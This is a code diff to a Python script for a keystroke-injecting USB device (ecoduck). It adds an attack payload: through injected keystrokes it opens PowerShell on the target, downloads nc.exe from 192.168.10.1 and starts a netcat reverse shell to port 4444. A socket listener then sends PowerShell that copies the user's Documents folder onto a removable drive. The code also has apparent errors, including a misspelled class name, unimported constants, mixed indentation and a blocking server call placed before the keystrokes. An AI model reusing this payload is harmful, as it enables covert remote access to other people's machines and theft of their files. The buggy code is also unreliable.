@@ -1,54 +1,18 @@
 from ecoduck import eco
 
-import os,signal,io
+import os,signal,io,http.server,socketserver, socket
 from time import sleep
 from subprocess import Popen, PIPE, check_output
 
+from multiprocessing import Process
 
-
-
-def wait_till_disconnect():
-	# Loops till electrical tests fails
-	print("Waiting for device removal")
-	while(electrical_test("/dev/hidg0",1)):
-		sleep(3)
-	print("Disconnected!")
-
-
-def timeout_handler():
-	# Helper function for electrical_test
-	raise Execption("Timeout")
-
-def electrical_test(path, timeout):
-	# Checks for a led HID packet from the host - proves target is connected, then resets capslock if it is on
-	signal.signal(signal.SIGALRM, timeout_handler)
-	signal.alarm(timeout)
-	try:
-		write_report(b'\x00\x00\x39\x00\x00\x00\x00\x00',"/dev/hidg0")
-		write_report(b'\x00\x00\x00\x00\x00\x00\x00\x00',"/dev/hidg0")
-		fd = os.open(path, os.O_RDWR)
-		state=os.read(fd,4)
-		os.close(fd)
-		if(state == b'\x02'):
-			write_report(b'\x00\x00\x39\x00\x00\x00\x00\x00',"/dev/hidg0")
-			write_report(b'\x00\x00\x00\x00\x00\x00\x00\x00',"/dev/hidg0")
-			fd = os.open(path, os.O_RDWR)
-			state=os.read(fd,4)
-			os.close(fd)
-	except:
-		return False
-	signal.alarm(0)
-	return True
-
-def get_last_lease():
-	fd = io.open("/var/lib/misc/dnsmasq.leases", "r")
-	firstline = fd.readline()
-	columns=firstline.split(" ")
-	print("Found target IP: " + columns[2])
-	return columns[2]
-
-
-
+shellcode="""$foldername = $env:computername
+$mydrive=(GWmi Win32_LogicalDisk | ?{$_.VolumeName -eq 'CAMERA'} | %{$_.DeviceID})
+$destinationFolder = "$mydrive\\$foldername"
+if (!(Test-Path -path $destinationFolder)) {New-Item $destinationFolder -Type Directory}
+$target = [Environment]::GetFolderPath("MyDocuments")
+Get-ChildItem -Path $target -Recurse -Include *  | Copy-Item -Destination $destinationFolder -verbose
+Write-Host "The file sync is complete." """
 
 # Ensures simple gadget is selected
 __location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
@@ -84,14 +48,41 @@ while(1):
 		sleep(2)
 		wait_till_disconnect()
 
+def reverse_shell_listener():
+	s = socket.socket(AF_INET, SOCK_STREAM) # Create our socket handler.
+	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) # Set is so that when we cancel out we can reuse port.
+	try:
+	    s.bind(('', 4444)) # Bind to interface.
+	    print("[*] Listening on 0.0.0.0:4444") # Print we are accepting connections.
+	    s.listen(10) # Listen for only 10 unaccepted connections.
+	    conn, addr = s.accept() # Accept connections.
+	    print("[+] Connected by", addr) # Print connected by ipaddress.
+	    data = conn.recv(1024).decode("UTF-8") # Receive initial connection.
+        conn.send(bytes(shellcode, "UTF-8")) # Send shell command.
+        data = conn.recv(1024).decode("UTF-8") # Receive output from command.
+        print(data) # Print the output of the command.
+	except KeyboardInterrupt: 
+	    print("...listener terminated using [ctrl+c], Shutting down!")
+	    exit() # Using [ctrl+c] will terminate the listener.
+
+
 def payload():
-	# Setup HTTP Server on ./http
+	web_dir = os.path.join(os.path.dirname(__file__), 'http')
+	os.chdir(web_dir)
+	httpHandler = http.server.SimpleHTTPRequestHandler
+	httpd = socketserver.TCPSERVER(('',8000),httpHandler)
+	httpd.serve_forever()
 	eco.press("LGUI+R")
 	sleep(1)
 	eco.type("powershell")
 	eco.press("ENTER")
-	# Open command prompt
-	# Download netcat
-	# Run netcat reverse shell
-	# Connect to shell with sockets
+	sleep(1)
+	eco.type("wget http://192.168.10.1/nc.exe -OutFile nc.exe")
+	sleep(5)
+
+	listener=Process(target=reverse_shell_listener)
+	listener.start()
+	eco.type("nc.exe 192.168.10.1 4444 –e powershell.exe")
+	listener.join()
 	# Copy Documents Directory to Flash Drive
+	httpd.shutdown()
